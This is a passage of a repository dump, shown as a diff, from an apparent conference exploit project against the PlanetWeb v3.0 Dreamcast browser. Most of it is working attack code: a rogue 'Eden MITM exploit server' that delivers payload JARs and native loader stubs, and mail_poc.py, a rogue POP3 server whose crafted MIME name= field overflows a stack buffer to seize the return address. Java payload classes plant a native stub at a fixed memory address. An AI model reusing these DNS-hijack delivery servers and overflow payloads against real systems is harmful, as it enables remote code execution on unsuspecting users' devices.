+            print("[repro] >>> #%d/%d : %s" % (n % len(reps), len(reps), nm))
+            html = ('<html><head><meta http-equiv="refresh" content="3;url=/rp/%d_%d"></head>'
+                    '<body bgcolor=black>%s'
+                    '<script>setTimeout(function(){location.href="/rp/%d_%d";},3000);</script>'
+                    '</body></html>' % (nxt, tok, rembed, nxt, tok))
+            return self._send(html, "text/html")
+        if path.startswith("/fz/"):
+            if (WWW/"REPRO").exists():
+                print("[repro] >>> /fz/ diverted to /rp/0 (repro armed)")
+                return self._send('<html><head><meta http-equiv="refresh" content="1;url=/rp/0">'
+                                  '</head><body bgcolor=black><script>location.href="/rp/0";</script>'
+                                  '</body></html>', "text/html")
+            if (WWW/"SPECTRUM").exists():
+                # armed for spectrum triage: divert the fuzz loop into /sp/0
+                print("[spectrum] >>> /fz/ diverted to /sp/0 (triage armed)")
+                return self._send('<html><head><meta http-equiv="refresh" content="1;url=/sp/0">'
+                                  '</head><body bgcolor=black><script>location.href="/sp/0";</script>'
+                                  '</body></html>', "text/html")
+            # dynamic: mutate a FRESH batch + return an auto-refreshing page that
+            # navigates to a new unique /fz/ URL -> continuous in-browser fuzzing
+            html, bid = gen_fuzz_page()
+            print("[fuzz] >>> batch #%d served (%d mutated images, auto-refresh %ds)"
+                  % (bid, FUZZ_BATCH, FUZZ_REFRESH))
+            return self._send(html, "text/html")
+        if path == "/junkyard.gif":
+            return self._serve_file("junkyard.gif", "image/gif")
+        if path == "/doom.bin":
+            print("[7] >>> serving doom.bin  ***native SH-4 DOOM engine -> staged to RAM***")
+            p = ROOT / "build" / "doom.bin"
+            if not p.exists(): return self._send("build doom.bin (native_doom; make)", "text/plain", 500)
+            return self._send_binary(p.read_bytes(), "application/octet-stream")
+        if path == "/stub.bin":
+            # stagedoom uses the E1M1-sized stub (matches the smaller /doom.wad above);
+            # every other path keeps build/stub.bin (the GDB demo's 3.4MB-trim stub).
+            p = (ROOT/"build"/"stub_native.bin") if CHAIN=="stagedoom" else (ROOT/"build"/"stub.bin")
+            print("[7b] >>> serving %s  ***native loader stub -> planted at fixed 0x8C29ADE8***" % p.name)
+            if not p.exists():
+                hint = "run build_stage_native.py" if CHAIN=="stagedoom" else "run build_stage_email.py"
+                return self._send("build %s (%s)" % (p.name, hint), "text/plain", 500)
+            return self._send_binary(p.read_bytes(), "application/octet-stream")
+        # default: try www/ with a content-type guessed from the extension
+        ext = path.rsplit(".", 1)[-1].lower() if "." in path else ""
+        ctype = {"gif":"image/gif","jpg":"image/jpeg","jpeg":"image/jpeg","png":"image/png",
+                 "wav":"audio/x-wav","swf":"application/x-shockwave-flash",
+                 "jar":"application/java-archive","class":"application/java-vm",
+                 "html":"text/html","htm":"text/html","js":"application/x-javascript"}.get(ext, "application/octet-stream")
+        # gzip-transport fuzz files (ff_<n>_gz.<ext>) are served with the gzip
+        # Content-Encoding so the browser runs them through inflate before decode.
+        enc = "gzip" if "_gz." in path else None
+        if "_gz." in path:  # content-type from the inner ext
+            ie = path.rsplit(".",1)[-1].lower()
+            ctype = {"png":"image/png","jpg":"image/jpeg","gif":"image/gif"}.get(ie, ctype)
+        if path.lstrip("/").startswith("fuzz/"):
+            print("[fuzz] >>> serving %s (%s%s)" % (path, ctype, " gzip" if enc else ""))
+        return self._serve_file(path.lstrip("/"), ctype, optional=True, encoding=enc)
+
+    def _serve_file(self, name, ctype, optional=False, encoding=None):
+        f = WWW / name
+        if not f.exists():
+            msg = "(missing) " + name
+            return self._send(msg, "text/plain", 404 if optional else 500)
+        return self._send(f.read_bytes(), ctype, encoding=encoding)
+
+    # ---- POST ---- #
+    def do_POST(self):
+        path = self.path.split("?", 1)[0]
+        body = self._read_body()
+        if path == "/login":
+            m = DEVID_RE.search(body)
+            devid = m.group(1).decode("ascii", "replace") if m else "0"
+            print("[2] >>> POST /login  (device:id=%s) -> login:response, status=0" % devid)
+            return self._send(login_response(devid), "text/xml")
+        if path == "/discovery":
+            print("[3] >>> POST /discovery -> 1 service, subscription-url=/subscribe")
+            return self._send(discovery_response(), "text/xml")
+        if path == "/subscribe":
+            print("[4] >>> POST /subscribe -> service-download-url=/pwn.jar")
+            return self._send(subscription_response(), "text/xml")
+        if path == "/arm":
+            text = body.decode("latin1", "replace")
+            for ln in text.splitlines():
+                tag = "  *** AUTONOMOUS FIRE ***" if "FIRED" in ln else ""
+                print("[ARM] " + ln + tag)
+            try:
+                with open(ROOT / "arm_result.txt", "a") as f: f.write(text)
+            except Exception: pass
+            return self._send("ok", "text/plain")
+        if path == "/heapdiag":
+            text = body.decode("latin1", "replace")
+            print("\n[RID DIAGNOSTIC] (%d bytes):" % len(body))
+            for ln in text.splitlines():
+                print("    " + ln)
+            try: (ROOT / "heapdiag.txt").write_text(text)
+            except Exception: pass
+            print("[*] >>> saved -> heapdiag.txt\n")
+            return self._send("ok", "text/plain")
+        if path == "/heap":
+            text = body.decode("latin1", "replace")
+            print("\n[HEAP PROBE RESULT] (%d bytes):" % len(body))
+            for ln in text.splitlines():
+                print("    " + ln)
+            try: (ROOT / "heap_probe.txt").write_text(text)
+            except Exception: pass
+            print("[*] >>> saved -> heap_probe.txt\n")
+            return self._send("ok", "text/plain")
+        if path == "/report":
+            print("[*] >>> NATIVE recon report received (%d bytes):" % len(body))
+            try:
+                text = body.decode("latin1")
+                rp = ROOT / "native_report.txt"
+                rp.write_text(text)
+                # show a quick summary: codes that returned OK (live native commands)
+                oks = [ln for ln in text.splitlines() if "\tOK\t" in ln]
+                print("    %d codes responded OK (live native commands); full -> %s"
+                      % (len(oks), rp))
+                for ln in oks[:40]:
+                    print("      " + ln.replace("\t", "  "))
+            except Exception as e:
+                print("    (could not parse report: %s)" % e)
+            return self._send("ok", "text/plain")
+        print("[?] unexpected POST %s\n%s" % (path, body[:512]))
+        return self._send("<ok/>", "text/xml")
+
+
+def main():
+    global EDEN_HOST, CHAIN
+    ap = argparse.ArgumentParser(description="Eden rogue-server exploit driver")
+    ap.add_argument("-b", "--bind", default="0.0.0.0")
+    ap.add_argument("-p", "--port", type=int, default=80,
+                    help="must be 80 (edenserverport default); needs root")
+    ap.add_argument("--host", default=EDEN_HOST,
+                    help="hostname to embed in served URLs (default eden.planetweb.com)")
+    ap.add_argument("--chain", choices=("splash", "calc", "jdoom", "native", "overflow", "fuzz", "takeover", "ridexploit", "nativedoom", "heapprobe", "armexploit", "looparm", "stagedoom"), default="jdoom",
+                    help="which payload chain to deliver at /pwn.jar")
+    args = ap.parse_args()
+    EDEN_HOST = args.host
+    CHAIN = args.chain
+
+    jar = CHAIN_JARS[CHAIN]
+    print("=" * 64)
+    print(" Eden MITM exploit server   chain=%s" % CHAIN)
+    print(" impersonating http://%s:%d" % (EDEN_HOST, args.port))
+    print(" point the Dreamcast's DNS for %s at this machine" % EDEN_HOST)
+    print(" service jar: %s  (%s)" % (jar.name, "present" if jar.exists() else "MISSING - ./build.sh"))
+    if CHAIN == "jdoom":
+        print(" IWAD: %s  (%.1f MB)" % (DOOM_WAD.name, DOOM_WAD.stat().st_size/1e6 if DOOM_WAD.exists() else 0))
+    print(" chain: conf->login->discovery->subscribe->pwn.jar" +
+          ("->doom.jar->doom.wad" if CHAIN == "jdoom" else
+           "->/report" if CHAIN == "native" else "->junkyard.html"))
+    print("=" * 64)
+    ThreadingHTTPServer((args.bind, args.port), Handler).serve_forever()
+
+
+if __name__ == "__main__":
+    main()
+
+```
+
+`emu/flycast-native/Flycast.app/Contents/Info.plist`:
+
+```plist
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>CFBundleDocumentTypes</key>
+	<array>
+		<dict>
+			<key>CFBundleTypeExtensions</key>
+			<array>
+				<string>chd</string>
+				<string>gdi</string>
+				<string>cdi</string>
+				<string>cue</string>
+				<string>zip</string>
+				<string>7z</string>
+			</array>
+			<key>CFBundleTypeRole</key>
+			<string>Viewer</string>
+		</dict>
+	</array>
+	<key>CFBundleDevelopmentRegion</key>
+	<string>English</string>
+	<key>CFBundleExecutable</key>
+	<string>Flycast</string>
+	<key>CFBundleGetInfoString</key>
+	<string></string>
+	<key>CFBundleIconFile</key>
+	<string>AppIcon</string>
+	<key>CFBundleIconName</key>
+	<string>AppIcon</string>
+	<key>CFBundleIdentifier</key>
+	<string>com.flyinghead.Flycast</string>
+	<key>CFBundleInfoDictionaryVersion</key>
+	<string>6.0</string>
+	<key>CFBundleLongVersionString</key>
+	<string>d4fc077</string>
+	<key>CFBundleName</key>
+	<string>Flycast</string>
+	<key>CFBundlePackageType</key>
+	<string>APPL</string>
+	<key>CFBundleShortVersionString</key>
+	<string>d4fc077</string>
+	<key>CFBundleSignature</key>
+	<string>????</string>
+	<key>CFBundleVersion</key>
+	<string>d4fc077</string>
+	<key>CSResourcesFileMapped</key>
+	<true/>
+	<key>NSHumanReadableCopyright</key>
+	<string>Copyright © 2026 Flycast contributors. All rights reserved.</string>
+	<key>NSPrincipalClass</key>
+	<string>NSApplication</string>
+	<key>NSMainNibFile</key>
+	<string>MainMenu</string>
+	<key>NSMicrophoneUsageDescription</key>
+	<string>Flycast requires microphone access to emulate the Dreamcast microphone</string>
+	<key>LSMinimumSystemVersion</key>
+	<string>$(MACOSX_DEPLOYMENT_TARGET)</string>
+	<key>NSHighResolutionCapable</key>
+	<true/>
+	<key>LSApplicationCategoryType</key>
+	<string>public.app-category.games</string>
+</dict>
+</plist>
+
+```
+
+`emu/flycast-native/Flycast.app/Contents/Resources/Images.xcassets/AppIcon.appiconset/Contents.json`:
+
+```json
+{
+  "images" : [
+    {
+      "filename" : "Icon-16.png",
+      "idiom" : "mac",
+      "scale" : "1x",
+      "size" : "16x16"
+    },
+    {
+      "filename" : "Icon-32.png",
+      "idiom" : "mac",
+      "scale" : "2x",
+      "size" : "16x16"
+    },
+    {
+      "filename" : "Icon-33.png",
+      "idiom" : "mac",
+      "scale" : "1x",
+      "size" : "32x32"
+    },
+    {
+      "filename" : "Icon-64.png",
+      "idiom" : "mac",
+      "scale" : "2x",
+      "size" : "32x32"
+    },
+    {
+      "filename" : "Icon-128.png",
+      "idiom" : "mac",
+      "scale" : "1x",
+      "size" : "128x128"
+    },
+    {
+      "idiom" : "mac",
+      "scale" : "2x",
+      "size" : "128x128"
+    },
+    {
+      "filename" : "Icon-256.png",
+      "idiom" : "mac",
+      "scale" : "1x",
+      "size" : "256x256"
+    },
+    {
+      "idiom" : "mac",
+      "scale" : "2x",
+      "size" : "256x256"
+    },
+    {
+      "filename" : "Icon-512.png",
+      "idiom" : "mac",
+      "scale" : "1x",
+      "size" : "512x512"
+    },
+    {
+      "filename" : "Icon-1024.png",
+      "idiom" : "mac",
+      "scale" : "2x",
+      "size" : "512x512"
+    }
+  ],
+  "info" : {
+    "author" : "xcode",
+    "version" : 1
+  }
+}
+
+```
+
+`emu/flycast-native/Flycast.app/Contents/_CodeSignature/CodeResources`:
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>files</key>
+	<dict>
+		<key>Resources/Images.xcassets/AppIcon.appiconset/Contents.json</key>
+		<data>
+		W0wdcKNLkxzdeoDWOEvJac0108o=
+		</data>
+		<key>Resources/Images.xcassets/AppIcon.appiconset/Icon-1024.png</key>
+		<data>
+		iV9wrZQ71O3v35kRiDJmDL9hbdA=
+		</data>
+		<key>Resources/Images.xcassets/AppIcon.appiconset/Icon-128.png</key>
+		<data>
+		9c179LNOK+dsbkDf0DPl+tWaF78=
+		</data>
+		<key>Resources/Images.xcassets/AppIcon.appiconset/Icon-16.png</key>
+		<data>
+		Atvlg2uCL+aRJDqw2t+axlSFVCU=
+		</data>
+		<key>Resources/Images.xcassets/AppIcon.appiconset/Icon-256.png</key>
+		<data>
+		4OsPzNEPRH3HuOhu//lcW/zG01E=
+		</data>
+		<key>Resources/Images.xcassets/AppIcon.appiconset/Icon-32.png</key>
+		<data>
+		WdmPKVb/qrAVor3nC+60eYNwNSY=
+		</data>
+		<key>Resources/Images.xcassets/AppIcon.appiconset/Icon-33.png</key>
+		<data>
+		WdmPKVb/qrAVor3nC+60eYNwNSY=
+		</data>
+		<key>Resources/Images.xcassets/AppIcon.appiconset/Icon-512.png</key>
+		<data>
+		nTBHctiWAilL1rOGbdvxIEhGqQY=
+		</data>
+		<key>Resources/Images.xcassets/AppIcon.appiconset/Icon-64.png</key>
+		<data>
+		4UYfPPxSl5m8pJz4YGZN8BlvQgc=
+		</data>
+		<key>Resources/default.metallib</key>
+		<data>
+		bfskkH05y2MONfcu66Ir/ij5i2Q=
+		</data>
+	</dict>
+	<key>files2</key>
+	<dict>
+		<key>Resources/Images.xcassets/AppIcon.appiconset/Contents.json</key>
+		<dict>
+			<key>hash2</key>
+			<data>
+			sXLR5sQu9upKgLaUtuZMQo3QeJjI+cjRWfL5cbmpLLQ=
+			</data>
+		</dict>
+		<key>Resources/Images.xcassets/AppIcon.appiconset/Icon-1024.png</key>
+		<dict>
+			<key>hash2</key>
+			<data>
+			aeb3O0ktsaGuBnjI6ITk+VwlVTxRmiWETghwTRr0EiI=
+			</data>
+		</dict>
+		<key>Resources/Images.xcassets/AppIcon.appiconset/Icon-128.png</key>
+		<dict>
+			<key>hash2</key>
+			<data>
+			ckLsC9ilXlWhs+hVQ8YRkbu2TUa1zCYxD02nT2OrNOM=
+			</data>
+		</dict>
+		<key>Resources/Images.xcassets/AppIcon.appiconset/Icon-16.png</key>
+		<dict>
+			<key>hash2</key>
+			<data>
+			KtDLPMP10PMU+fbC1ch475pKzZon8Ni/Dp8RXFdV/GQ=
+			</data>
+		</dict>
+		<key>Resources/Images.xcassets/AppIcon.appiconset/Icon-256.png</key>
+		<dict>
+			<key>hash2</key>
+			<data>
+			VYBwJ2cqceiwdBVzIWYYfCoT8P+QXeZlGOZfB0TEpFU=
+			</data>
+		</dict>
+		<key>Resources/Images.xcassets/AppIcon.appiconset/Icon-32.png</key>
+		<dict>
+			<key>hash2</key>
+			<data>
+			Gn+lp7mG0x4WyjKnQxXL7h82Tr3loI+BcvRflIVO2zU=
+			</data>
+		</dict>
+		<key>Resources/Images.xcassets/AppIcon.appiconset/Icon-33.png</key>
+		<dict>
+			<key>hash2</key>
+			<data>
+			Gn+lp7mG0x4WyjKnQxXL7h82Tr3loI+BcvRflIVO2zU=
+			</data>
+		</dict>
+		<key>Resources/Images.xcassets/AppIcon.appiconset/Icon-512.png</key>
+		<dict>
+			<key>hash2</key>
+			<data>
+			WLqKoAdwpJqmfdCpXkl295Z2nKnybZI2xtmXJy8zHpA=
+			</data>
+		</dict>
+		<key>Resources/Images.xcassets/AppIcon.appiconset/Icon-64.png</key>
+		<dict>
+			<key>hash2</key>
+			<data>
+			r7nfqVKMeS/hT8lBZDKmroh6ImAY8S8uesDev38OTqg=
+			</data>
+		</dict>
+		<key>Resources/default.metallib</key>
+		<dict>
+			<key>hash2</key>
+			<data>
+			5cUCPZbgLnQxwT14si97ylE96ufxgbVbmxr/oq28yls=
+			</data>
+		</dict>
+	</dict>
+	<key>rules</key>
+	<dict>
+		<key>^Resources/</key>
+		<true/>
+		<key>^Resources/.*\.lproj/</key>
+		<dict>
+			<key>optional</key>
+			<true/>
+			<key>weight</key>
+			<real>1000</real>
+		</dict>
+		<key>^Resources/.*\.lproj/locversion.plist$</key>
+		<dict>
+			<key>omit</key>
+			<true/>
+			<key>weight</key>
+			<real>1100</real>
+		</dict>
+		<key>^Resources/Base\.lproj/</key>
+		<dict>
+			<key>weight</key>
+			<real>1010</real>
+		</dict>
+		<key>^version.plist$</key>
+		<true/>
+	</dict>
+	<key>rules2</key>
+	<dict>
+		<key>.*\.dSYM($|/)</key>
+		<dict>
+			<key>weight</key>
+			<real>11</real>
+		</dict>
+		<key>^(.*/)?\.DS_Store$</key>
+		<dict>
+			<key>omit</key>
+			<true/>
+			<key>weight</key>
+			<real>2000</real>
+		</dict>
+		<key>^(Frameworks|SharedFrameworks|PlugIns|Plug-ins|XPCServices|Helpers|MacOS|Library/(Automator|Spotlight|LoginItems))/</key>
+		<dict>
+			<key>nested</key>
+			<true/>
+			<key>weight</key>
+			<real>10</real>
+		</dict>
+		<key>^.*</key>
+		<true/>
+		<key>^Info\.plist$</key>
+		<dict>
+			<key>omit</key>
+			<true/>
+			<key>weight</key>
+			<real>20</real>
+		</dict>
+		<key>^PkgInfo$</key>
+		<dict>
+			<key>omit</key>
+			<true/>
+			<key>weight</key>
+			<real>20</real>
+		</dict>
+		<key>^Resources/</key>
+		<dict>
+			<key>weight</key>
+			<real>20</real>
+		</dict>
+		<key>^Resources/.*\.lproj/</key>
+		<dict>
+			<key>optional</key>
+			<true/>
+			<key>weight</key>
+			<real>1000</real>
+		</dict>
+		<key>^Resources/.*\.lproj/locversion.plist$</key>
+		<dict>
+			<key>omit</key>
+			<true/>
+			<key>weight</key>
+			<real>1100</real>
+		</dict>
+		<key>^Resources/Base\.lproj/</key>
+		<dict>
+			<key>weight</key>
+			<real>1010</real>
+		</dict>
+		<key>^[^/]+$</key>
+		<dict>
+			<key>nested</key>
+			<true/>
+			<key>weight</key>
+			<real>10</real>
+		</dict>
+		<key>^embedded\.provisionprofile$</key>
+		<dict>
+			<key>weight</key>
+			<real>20</real>
+		</dict>
+		<key>^version\.plist$</key>
+		<dict>
+			<key>weight</key>
+			<real>20</real>
+		</dict>
+	</dict>
+</dict>
+</plist>
+
+```
+
+`mail_poc.py`:
+
+```py
+#!/usr/bin/env python3
+"""
+mail_poc.py -- TARGETED PoC POP3 server for the PlanetWeb v3.0 native MIME-attachment
+stack overflow in fn_application_x_dreamcas (0x8C04669C).
+
+The bug: parsing a multipart part with  Content-Type: image/...; name="VALUE"
+the handler copies VALUE byte-by-byte into a 64-byte stack buffer (r15+0x10),
+stopping only on '"' / ' ' / NUL in the input. Saved PR is at r15+0x50, i.e.
+0x40 (64) bytes above the buffer -> a VALUE of  PAD(64) + 4-byte addr  overwrites
+the function's saved return address. No canary, no ASLR -> direct PC control.
+
+This serves ONE message: a clean multipart/mixed with a single image/gif part whose
+name= is the overflow payload. Boundary is CONSISTENT (declared == delimiter), unlike
+the fuzzer. Point the browser's POP3 host here (DNS MITM) and hit "Check Mail".
+
+Knobs (env or args):
+  MAIL_PAD  (default 64)        bytes before the saved-PR slot
+  MAIL_PC   (default AABBCCDD)  4-byte value (hex) written over saved PR (little-endian)
+                               -- a recognizable marker for live GDB confirmation.
+  --pop     (default 110)
+
+Payload bytes avoid 0x22('"') 0x20(' ') 0x00 which would truncate the copy early.
+"""
+import argparse, os, socket, threading, sys, time, struct
+
+PAD = int(os.environ.get("MAIL_PAD", "64"))
+PC  = int(os.environ.get("MAIL_PC", "AABBCCDD"), 16)
+RETR_DELAY = float(os.environ.get("MAIL_RETR_DELAY", "2.5"))  # hold body after RETR so staging lands
+LOG = sys.stderr
+
+UID = str(int(time.time()))
+def log(m): LOG.write("    [mailpoc] " + m + "\n"); LOG.flush()
+
+def name_payload():
+    pf = os.path.join(os.path.dirname(os.path.abspath(__file__)), "name_payload.hex")
+    if os.path.exists(pf):                 # file-driven payload (update without restart)
+        hx = open(pf).read().strip()
+        if hx:
+            b = bytes.fromhex(hx)
+            bad = [i for i,x in enumerate(b) if x in set(b'\x00\x20\x22')]
+            if bad: log("WARNING: name_payload.hex copy-terminating bytes at %s" % bad[:5])
+            log("using name_payload.hex (%d bytes)" % len(b))
+            return b
+    hx = os.environ.get("MAIL_NAME_HEX")
+    if hx:                                 # exact weaponized payload (pad+PR+sled+stub)
+        b = bytes.fromhex(hx)
+        bad = [i for i,x in enumerate(b) if x in set(b'\x00\x20\x22')]
+        if bad: log("WARNING: MAIL_NAME_HEX has copy-terminating bytes at %s" % bad[:5])
+        log("using MAIL_NAME_HEX payload (%d bytes)" % len(b))
+        return b
+    pc = struct.pack("<I", PC)            # little-endian SH-4
+    bad = set(b'\x00\x20\x22')
+    if any(b in bad for b in pc):
+        log("WARNING: MAIL_PC=%08X contains a copy-terminating byte (00/20/22) -> will truncate" % PC)
+    return b"A" * PAD + pc                 # 64 pad + 4-byte saved-PR overwrite
+
+def gif_body():
+    # minimal 1x1 GIF89a so the part has plausible image bytes (overflow is in the
+    # header name= parse, before any image decode, so content barely matters)
+    return (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff"
+            b"!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;")
+
+def build_message():
+    nm = name_payload()
+    body = gif_body()
+    # CRLF line-structured RFC822 + MIME multipart. Consistent boundary "BND".
+    parts = []
+    parts.append(b"From: attacker@evil.example <a@b>")
+    parts.append(b"To: victim@planetweb.com")
+    _sf=os.path.join(os.path.dirname(os.path.abspath(__file__)),"mail_subject.txt")
+    _subj=open(_sf).read().strip() if os.path.exists(_sf) else "hi"
+    parts.append(b"Subject: "+_subj.encode())
+    parts.append(b"MIME-Version: 1.0")
+    parts.append(b'Content-Type: multipart/mixed; boundary="BND"')
+    parts.append(b"")
+    # BLOB FIRST so it is fully downloaded before the overflow part is parsed
+    # (the browser parses incrementally; overflow must fire AFTER the blob arrives).
+    bf = os.path.join(os.path.dirname(os.path.abspath(__file__)), "doom_blob.txt")
+    if os.path.exists(bf):
+        blob = open(bf, "rb").read().strip()
+        parts.append(b"--BND")
+        parts.append(b"Content-Type: application/octet-stream")
+        parts.append(b"")
+        for i in range(0, len(blob), 8000):
+            parts.append(blob[i:i+8000])
+        log("carried blob: %d bytes (%d lines)" % (len(blob), (len(blob)+75)//76))
+    # the overflow part LAST: image/ content-type with the oversized name=
+    parts.append(b"--BND")
+    parts.append(b'Content-Type: image/gif; name="' + nm + b'"')
+    parts.append(b"")
+    parts.append(body)
+    parts.append(b"--BND--")
+    return b"\r\n".join(parts) + b"\r\n"
+
+MSG = build_message()
+
+def pop3(conn, addr):
+    MSG = build_message()   # rebuild per-connection (live payload)
+    f = conn.makefile("rwb", buffering=0)
+    def send(s):
+        if isinstance(s, str): s = s.encode("latin1", "ignore")
+        f.write(s + b"\r\n")
+    try:
+        send("+OK PlanetWeb PoP3 ready")
+        while True:
+            line = f.readline()
+            if not line: break
+            cmd = line.strip().split(b" ", 1)[0].upper()
+            log("<= %r" % line[:50])
+            if   cmd == b"USER": send("+OK user")
+            elif cmd == b"PASS": send("+OK 1 message")
+            elif cmd == b"CAPA": send("+OK"); send("UIDL"); send("TOP"); send(".")
+            elif cmd == b"STAT": send("+OK 1 %d" % len(MSG))
+            elif cmd == b"LIST": send("+OK 1 message"); send("1 %d" % len(MSG)); send(".")
+            elif cmd == b"UIDL": send("+OK"); send("1 POC"+UID); send(".")
+            elif cmd == b"TOP":
+                send("+OK top");
+                for ln in MSG.split(b"\r\n"):
+                    if ln == b"": break
+                    f.write((b".." if ln.startswith(b".") else ln) + b"\r\n")
+                send(""); send(".")
+            elif cmd == b"RETR":
+                send("+OK %d octets" % len(MSG))
+                log(">>> RETR received -- staging window open (delaying body %.1fs)" % RETR_DELAY)
+                # The 315-byte body renders the instant it arrives, faster than the ~1s
+                # GDB staging. If the demo staged on TOP (preview) the stub is already
+                # planted; but if the client opened DIRECTLY (no preview), hold the body
+                # briefly so the demo -- which triggers on this RETR log line -- finishes
+                # planting the stub before the overflow renders.
+                time.sleep(RETR_DELAY)
+                log(">>> sending crafted message (%d bytes) in big chunks" % len(MSG))
+                # dot-stuff (no-op for our hex/MIME lines) then send in 64KB chunks (fast)
+                stuffed=b"\r\n".join((b"."+ln if ln.startswith(b".") else ln) for ln in MSG.split(b"\r\n"))
+                for i in range(0,len(stuffed),65536): f.write(stuffed[i:i+65536])
+                f.write(b"\r\n.\r\n")
+            elif cmd == b"DELE": send("+OK")
+            elif cmd == b"NOOP": send("+OK")
+            elif cmd == b"QUIT": send("+OK bye"); break
+            else: send("+OK")
+    except Exception as e:
+        log("conn closed: %s" % e)
+    finally:
+        try: conn.close()
+        except: pass
+
+if __name__ == "__main__":
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--pop", type=int, default=110)
+    args = ap.parse_args()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind(("0.0.0.0", args.pop)); s.listen(8)
+    log("rogue PoC POP3 on :%d | name= payload %d bytes (PAD=%d + PC=0x%08X)"
+        % (args.pop, PAD + 4, PAD, PC))
+    log("message bytes=%d ; point browser POP3 host here + Check Mail" % len(MSG))
+    while True:
+        c, a = s.accept(); log("<<< connection from %s" % (a,))
+        threading.Thread(target=pop3, args=(c, a), daemon=True).start()
+
+```
+
+`patches/flycast-picoppp-reap.patch`:
+
+```patch
+diff --git a/core/network/picoppp.cpp b/core/network/picoppp.cpp
+--- a/core/network/picoppp.cpp
++++ b/core/network/picoppp.cpp
+@@ -685,7 +685,10 @@ void PicoTcp::picoSocketLoop()
+ 				pico_ipv4_to_string(peer, sock_a->local_addr.ip4.addr);
+ 				DEBUG_LOG(NETWORK, "TcpSink: Outbound from port %d to %s:%d", short_be(port), peer, short_be(sock_a->local_port));
+ 				pico_socket_setoption(sock_a, PICO_TCP_NODELAY, &yes);
+-				pico_tcp_set_linger(sock_a, 10000);
++				// PlanetWeb's StageDoom opens sequential short-lived range requests;
++				// the upstream 10-second linger retains enough picoTCP state to
++				// exhaust the emulated network stack before staging completes.
++				pico_tcp_set_linger(sock_a, 1000);
+ 
+ 				TcpSocket::Ptr psock = TcpSocket::create(io_context, directPlay);
+ 				psock->connect(sock_a);
+
+```
+
+`src/org/junkyard/Junk.java`:
+
+```java
+package org.junkyard;
+
+import com.planetweb.eden.client.Eden;
+import com.planetweb.eden.client.system.SystemInterface;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.io.ByteArrayOutputStream;
+import java.net.URL;
+import java.net.HttpURLConnection;
+
+/** Shared payload helpers (PersonalJava 1.1 compatible). */
+public class Junk {
+    public static final String BASE = "http://eden.planetweb.com";
+
+    public static void banner(String what) {
+        Eden.println("=================================================");
+        Eden.println("  DistrictCon Junkyard -- PlanetWeb v3.0 RCE");
+        Eden.println("  " + what);
+        Eden.println("=================================================");
+    }
+
+    /** read on-device-only properties: proves our code runs on the target */
+    public static void prove() {
+        try {
+            Eden.println("os.name=" + System.getProperty("os.name")
+                + " os.arch=" + System.getProperty("os.arch")
+                + " java=" + System.getProperty("java.version"));
+            Eden.println("browser=" + System.getProperty("browser"));
+        } catch (Throwable t) { Eden.println("[!] prop read: " + t); }
+    }
+
+    public static void openURL(String url) {
+        try {
+            SystemInterface si = Eden.getSystemInterface();
+            if (si != null) { si.openURL(url); Eden.println("[+] openURL -> " + url); }
+        } catch (Throwable t) { Eden.println("[!] openURL: " + t); }
+    }
+
+    public static byte[] httpGet(String url) throws Exception {
+        InputStream in = new URL(url).openStream();
+        ByteArrayOutputStream bos = new ByteArrayOutputStream();
+        byte[] b = new byte[8192]; int n;
+        while ((n = in.read(b)) > 0) bos.write(b, 0, n);
+        in.close(); return bos.toByteArray();
+    }
+
+    public static void httpPost(String url, String body) {
+        try {
+            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
+            c.setRequestMethod("POST"); c.setDoOutput(true);
+            byte[] b = body.getBytes();
+            c.setRequestProperty("Content-Length", String.valueOf(b.length));
+            OutputStream os = c.getOutputStream(); os.write(b); os.close();
+            c.getInputStream().close();
+        } catch (Throwable t) { Eden.println("[!] report POST: " + t); }
+    }
+}
+
+```
+
+`src/org/junkyard/StageDoom.java`:
+
+```java
+package org.junkyard;
+
+import com.planetweb.eden.client.Eden;
+import com.planetweb.eden.client.service.Service;
+import com.planetweb.eden.client.service.ServiceInfo;
+import com.planetweb.eden.client.system.SystemInterface;
+import java.io.InputStream;
+import java.lang.reflect.Method;
+import java.net.URL;
+
+/**
+ * CHAIN "stagedoom" -- FAST data transport + RELIABLE native code placement for the
+ * email-overflow DOOM chain.
+ *
+ * Two reliable, Java-driven steps (Java runs deterministically every boot):
+ *
+ *  (1) TRANSPORT: download doom.bin + WAD over plain HTTP into ONE raw byte[] =
+ *      MAGIC(8) + doom + wad, pinned in a static field (g_keepalive) so the native
+ *      loader can scan the JVM heap for MAGIC and raw-memcpy it. No encoding.
+ *
+ *  (2) FIXED-ADDRESS STUB PLACEMENT (fixes exploit reliability): the native MIME
+ *      name= stack overflow gives PC control, but the stack location at trigger time
+ *      varies by ~32KB, so a hardcoded saved-PR -> on-stack-sled is a coin flip.
+ *      Instead we use the proven setRawDeviceID(100) native memcpy primitive
+ *      (dst = 0x8C29ABE6, FIXED) to plant the SH-4 loader stub at a DETERMINISTIC
+ *      address 0x8C29ADE8 (= DST + 0x202, 4-aligned, byte-safe). We read-modify-write
+ *      via getRawDeviceID(101) first so the IM-list head at DST+0x46 (and all other
+ *      live data in the buffer) is PRESERVED -- only the stub bytes change, so the
+ *      browser/mail UI keeps working until the email is opened.
+ *
+ *      The email then carries only:  pad(64) + saved-PR = 0x8C29ADE8.  The function's
+ *      rts jumps straight to the planted stub -- no sled, no stack dependence.
+ *
+ * This is NOT "Java DOOM": Java is only the data pipe + placement; the game is native SH-4.
+ */
+public class StageDoom extends Service {
+    static final String DOOM_URL = Junk.BASE + "/doom.bin";
+    static final String WAD_URL  = Junk.BASE + "/doom.wad";
+    static final String STUB_URL = Junk.BASE + "/stub.bin";       // Python-built native loader stub
+    static final byte[] MAGIC = { 'D','O','O','M','S','T','G','1' };   // == poc/magic.txt
